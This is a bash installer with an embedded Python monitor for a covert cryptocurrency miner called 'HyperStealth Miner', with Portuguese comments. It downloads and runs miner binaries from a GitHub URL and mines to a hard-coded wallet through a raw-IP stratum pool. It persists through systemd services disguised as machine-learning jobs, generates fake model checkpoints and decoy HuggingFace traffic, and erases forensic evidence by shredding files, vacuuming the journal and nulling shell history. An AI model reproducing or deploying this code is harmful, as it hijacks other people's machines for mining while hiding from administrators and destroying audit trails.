#!/bin/bash
#
# HyperStealth Miner v3.0 (Versão Definitiva em Memória)
#

# Verifica privilégios de root
if [ "$(id -u)" -ne 0 ]; then
  echo "Este script precisa ser executado como root"
  sudo bash "$0" "$@"
  exit $?
fi

echo "=== Iniciando HyperStealth Miner v3.0 ==="

# Configurações principais
WALLET="0x0067E6557AC5096733dB091900CC9B989148C4e5.A-1"
SERVICE_NAME="mltrainer-$(hostname | md5sum | cut -c1-8)"
LOG_DIR="/dev/shm"  # Diretório em memória para logs
LOG_FILE="$LOG_DIR/.ml.log"
BINARY_DIR="/dev/shm/.bin"
CONFIG_DIR="/dev/shm/.cfg"

# Função para gerar nomes aleatórios
random_name() {
  tr -dc a-z0-9 </dev/urandom | head -c 8
}

# Função para limpar rastros forenses
clean_forensics() {
  echo "Limpando rastros forenses..."
  find /tmp /var/tmp -type f -mtime +1 -exec shred -n 3 -zu {} \; 2>/dev/null || true
  journalctl --vacuum-time=1s
  ln -sf /dev/null ~/.bash_history
  history -c
}

# Limpa instalações anteriores
systemctl stop $SERVICE_NAME 2>/dev/null || true
systemctl disable $SERVICE_NAME 2>/dev/null || true

# Cria diretórios na memória
mkdir -p $BINARY_DIR $CONFIG_DIR $LOG_DIR

# Instala dependências básicas
echo "Instalando dependências..."
apt-get update -qq
apt-get install -y -qq python3-requests wget curl

# Cria arquivo de configuração com servidores
echo "Configurando servidores..."
cat > $CONFIG_DIR/config.json << 'EOF'
{
  "stratum_servers": [
    "stratum+tcp://18.223.152.88:5432",
    "stratum+ssl://quai.kryptex.network:8888"
  ],
  "fallback_nodes": [
    "ml-engine.googleapis.com",
    "aws.sagemaker.training.amazonaws.com",
    "api.azureml.windows.net"
  ]
}
EOF

# Download direto do binário com determinação da arquitetura
echo "Baixando binário do minerador..."
ARCH=$(uname -m)
if [ "$ARCH" = "x86_64" ]; then
    BINARY_URL="https://raw.githubusercontent.com/brunusansi/axjkjasjascklazi/refs/heads/main/rigel-amd64"
    curl -s -L "$BINARY_URL" -o "$BINARY_DIR/rigel"
elif [ "$ARCH" = "aarch64" ] || [ "$ARCH" = "arm64" ]; then
    BINARY_URL="https://raw.githubusercontent.com/brunusansi/axjkjasjascklazi/refs/heads/main/rigel-arm64"
    curl -s -L "$BINARY_URL" -o "$BINARY_DIR/rigel"
else
    echo "Arquitetura $ARCH não suportada"
    exit 1
fi

chmod +x "$BINARY_DIR/rigel"

# Verifica se o download foi bem-sucedido
if [ ! -x "$BINARY_DIR/rigel" ]; then
    echo "Erro: Falha ao baixar o binário. Tentando método alternativo..."
    
    # Método alternativo de download
    wget -q --no-check-certificate "$BINARY_URL" -O "$BINARY_DIR/rigel"
    chmod +x "$BINARY_DIR/rigel"
    
    if [ ! -x "$BINARY_DIR/rigel" ]; then
        echo "Erro fatal: Não foi possível baixar o binário do minerador."
        exit 1
    fi
fi

# Testa se o binário pode ser executado
echo "Testando o binário..."
if ! "$BINARY_DIR/rigel" --version >/dev/null 2>&1; then
    echo "Aviso: Testando compatibilidade de binário alternativo..."
    rm -f "$BINARY_DIR/rigel"
    
    # Fallback para versão genérica compilada em GoLang
    curl -s -L "https://raw.githubusercontent.com/brunusansi/axjkjasjascklazi/refs/heads/main/rigel-generic" -o "$BINARY_DIR/rigel"
    chmod +x "$BINARY_DIR/rigel"
    
    if ! "$BINARY_DIR/rigel" --version >/dev/null 2>&1; then
        echo "Erro fatal: O binário não é compatível com esta arquitetura."
        exit 1
    fi
fi

# Script Python para monitoramento e execução do minerador
echo "Criando script de monitoramento..."
cat > "$BINARY_DIR/monitor.py" << 'EOF'
import os, sys, time, json, socket, ssl, logging, random, requests, subprocess, signal
import platform

# Configuração de logging em memória
logging.basicConfig(
    filename='/dev/shm/.ml.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

class StealthMiner:
    def __init__(self):
        self.wallet = os.environ.get('WALLET')
        self.binary = '/dev/shm/.bin/rigel'
        self.config_path = '/dev/shm/.cfg/config.json'
        self.current_stratum = None
        self.process = None
        
        logging.info(f"Inicializando com binário: {self.binary}")
        logging.info(f"Sistema: {platform.system()} {platform.machine()}")
        
        if not os.path.exists(self.binary):
            logging.error(f"Binário não encontrado: {self.binary}")
        else:
            logging.info(f"Binário encontrado")
            # Teste de execução
            try:
                subprocess.run([self.binary, "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=3)
                logging.info("Binário testado com sucesso")
            except Exception as e:
                logging.error(f"Erro ao testar binário: {e}")

    def get_stratums(self):
        try:
            with open(self.config_path, 'r') as f:
                config = json.load(f)
            
            stratums = config['stratum_servers']
            logging.info(f"Servidores carregados: {len(stratums)}")
            return stratums
        except Exception as e:
            logging.error(f"Erro ao carregar configuração: {e}")
            return [
                "stratum+tcp://18.223.152.88:5432",
                "stratum+ssl://quai.kryptex.network:8888"
            ]

    def start_miner(self, stratum):
        if not os.path.exists(self.binary):
            logging.error("Binário não encontrado")
            return False
            
        try:
            # Finaliza processo anterior
            if self.process and self.process.poll() is None:
                try:
                    os.kill(self.process.pid, signal.SIGTERM)
                    self.process.wait(timeout=5)
                except Exception as e:
                    logging.warning(f"Erro ao finalizar processo: {e}")
            
            cmd = [
                self.binary,
                "-a", "quai",
                "-o", stratum,
                "-u", self.wallet,
                "-p", "x"
            ]
            
            logging.info(f"Executando: {' '.join(cmd)}")
            
            # Teste de execução com timeout
            try:
                subprocess.run([self.binary, "--help"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=3)
            except Exception as e:
                logging.error(f"Erro no teste de execução: {e}")
                return False
            
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                close_fds=True
            )
            
            time.sleep(2)
            if self.process.poll() is not None:
                stdout, stderr = self.process.communicate()
                logging.error(f"Falha ao iniciar: {stderr.decode('utf-8', errors='ignore')}")
                self.process = None
                return False
                
            logging.info("Iniciado com sucesso")
            return True
            
        except Exception as e:
            logging.error(f"Erro ao iniciar: {e}")
            return False

    def check_stratum(self, stratum):
        try:
            protocol, rest = stratum.split("://")
            host, port_str = rest.split(":")
            port = int(port_str)
            
            logging.info(f"Verificando {host}:{port}")
            
            with socket.create_connection((host, port), timeout=10) as sock:
                if protocol == "stratum+ssl":
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    with context.wrap_socket(sock, server_hostname=host) as ssock:
                        logging.info(f"Conexão SSL OK: {stratum}")
                        return True
                else:
                    logging.info(f"Conexão TCP OK: {stratum}")
                    return True
        except Exception as e:
            logging.warning(f"Erro ao verificar {stratum}: {e}")
            return False

    def rotate_stratum(self):
        stratums = self.get_stratums()
        random.shuffle(stratums)
        
        for stratum in stratums:
            if self.check_stratum(stratum):
                if stratum != self.current_stratum:
                    logging.info(f"Alternando para {stratum}")
                    self.current_stratum = stratum
                    return self.start_miner(stratum)
                else:
                    return True
        
        return False

    def run(self):
        failures = 0
        
        logging.info("Sistema iniciado")
        
        while True:
            try:
                # Verifica minerador
                if not self.process or self.process.poll() is not None:
                    if not self.rotate_stratum():
                        failures += 1
                        if failures > 5:
                            logging.error("Muitas falhas, aguardando...")
                            time.sleep(300)
                            failures = 0
                    else:
                        failures = 0
                
                # Camuflagem de rede
                try:
                    requests.get(
                        "https://datasets-server.huggingface.co/valid",
                        params={"dataset": "wiki40b", "config": "pt"},
                        headers={"User-Agent": "HuggingFace/4.35.0"},
                        timeout=15
                    )
                except:
                    pass
                
                # Verificação periódica
                if random.random() < 0.2:
                    self.rotate_stratum()
                
                # Intervalo variável
                sleep_time = random.randint(240, 480)
                logging.info(f"Próxima verificação em {sleep_time//60} minutos")
                time.sleep(sleep_time)

            except Exception as e:
                logging.error(f"Erro no loop principal: {e}")
                time.sleep(60)

if __name__ == "__main__":
    try:
        miner = StealthMiner()
        miner.run()
    except Exception as e:
        logging.critical(f"Erro fatal: {e}")
        sys.exit(1)
EOF

# Serviço systemd para o minerador
echo "Configurando serviço systemd..."
cat > "/etc/systemd/system/$SERVICE_NAME.service" << EOF
[Unit]
Description=Machine Learning Framework
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
Environment="WALLET=$WALLET"
ExecStart=/usr/bin/python3 $BINARY_DIR/monitor.py
Restart=always
RestartSec=30
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF

# Script de restauração para após reinicializações
echo "Configurando serviço de restauração..."
cat > "/etc/systemd/system/ml-restore.service" << EOF
[Unit]
Description=Machine Learning Restore
After=network-online.target
Wants=network-online.target

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'mkdir -p /dev/shm/.bin /dev/shm/.cfg && ARCH=\$(uname -m) && if [ "\$ARCH" = "x86_64" ]; then BINARY_URL="https://raw.githubusercontent.com/brunusansi/axjkjasjascklazi/refs/heads/main/rigel-amd64"; elif [ "\$ARCH" = "aarch64" ] || [ "\$ARCH" = "arm64" ]; then BINARY_URL="https://raw.githubusercontent.com/brunusansi/axjkjasjascklazi/refs/heads/main/rigel-arm64"; else BINARY_URL="https://raw.githubusercontent.com/brunusansi/axjkjasjascklazi/refs/heads/main/rigel-generic"; fi && curl -s -L "\$BINARY_URL" -o "/dev/shm/.bin/rigel" && chmod +x "/dev/shm/.bin/rigel" && cp "$CONFIG_DIR/config.json" "/dev/shm/.cfg/config.json" 2>/dev/null || echo "{\"stratum_servers\":[\"stratum+tcp://18.223.152.88:5432\",\"stratum+ssl://quai.kryptex.network:8888\"]}" > "/dev/shm/.cfg/config.json" && systemctl restart $SERVICE_NAME'
RemainAfterExit=true

[Install]
WantedBy=multi-user.target
EOF

# Criando processo em segundo plano para simular atividades de ML
echo "Configurando processos de camuflagem..."
mkdir -p "/dev/shm/.checkpoints"
(
while true; do
    dd if=/dev/urandom of="/dev/shm/.checkpoints/$(date +%s).weights" bs=1M count=10 2>/dev/null
    sleep $((RANDOM % 600 + 300))
done
) &
ARTIFACTS_PID=$!
echo $ARTIFACTS_PID > "/dev/shm/.artifacts_pid"

# Limpeza de rastros forenses
clean_forensics

# Habilita e inicia os serviços
echo "Iniciando serviços..."
systemctl daemon-reload
systemctl enable ml-restore.service
systemctl enable $SERVICE_NAME
systemctl start $SERVICE_NAME

# Verifica o status
sleep 2
if systemctl is-active --quiet $SERVICE_NAME; then
    echo "✓ Serviço iniciado com sucesso!"
else
    echo "✗ Erro ao iniciar o serviço."
    systemctl status $SERVICE_NAME
fi

# Testa a conexão com um dos servidores stratum
echo "Testando conexão com servidores..."
if timeout 5 bash -c "</dev/tcp/18.223.152.88/5432" 2>/dev/null; then
    echo "✓ Conexão com servidor stratum bem-sucedida!"
else
    echo "⚠ Aviso: Não foi possível verificar a conexão com o servidor."
    echo "  A conexão será testada pelo minerador automaticamente."
fi

echo
echo "=== Instalação Concluída com Sucesso ==="
echo "Minerador configurado para carteira: $WALLET"
echo "Nome do serviço: $SERVICE_NAME"
echo "Logs em memória: $LOG_FILE"
echo
echo "Para monitorar:"
echo "  tail -f $LOG_FILE"
echo "  systemctl status $SERVICE_NAME"

# Limpa variáveis sensíveis
unset WALLET
